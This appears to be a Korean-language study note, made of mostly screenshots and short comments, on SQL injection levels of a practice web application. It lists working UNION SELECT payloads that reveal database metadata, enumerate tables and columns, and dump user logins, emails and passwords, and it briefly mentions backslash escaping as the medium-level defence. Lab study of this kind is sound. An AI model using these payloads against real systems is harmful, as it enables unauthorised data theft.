# SQL_Injection(GET/Search)
---
![[Pasted image 20241010142112.png]]
- spider를 입력하면 나오는 결과
![[Pasted image 20241010142145.png]]
![[Pasted image 20241010142202.png]]
- 잘못된 구문에도 일일이 반응한다.
![[Pasted image 20241010142253.png]]
![[Pasted image 20241010142313.png]]
## union select
![[Pasted image 20241010142503.png]]
- 칼럼 순서를 확인할 수 있다.
![[Pasted image 20241010142620.png]]
```
'union select 1,database(),@@datadir,system_user(),@@version,6,7#
```
![[Pasted image 20241010142850.png]]
- 칼럼에 원하는 정보를 출력하도록 명령어를 삽입할 수 있다.

```
'union select 1,table_name,3,4,5,6,7 from information_schema.tables#
```
![[Pasted image 20241010143205.png]]

```
'union select 1,column_name,3,4,5,6,7 from information_schema.columns#
```
![[Pasted image 20241010143506.png]]

```
0'union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name="users"#
```
![[Pasted image 20241010143813.png]]

```
0'union select 1,id,login,email,password,6,7 from users#
```
![[Pasted image 20241010144049.png]]

medium
![[Pasted image 20241010144349.png]]
= 구문 뒤에 \\를 통해 sql 구문을 일반 문자열로 인식되도록 한다.


# SQL Injection (GET/Select)
---
![[Pasted image 20241010144726.png]]
 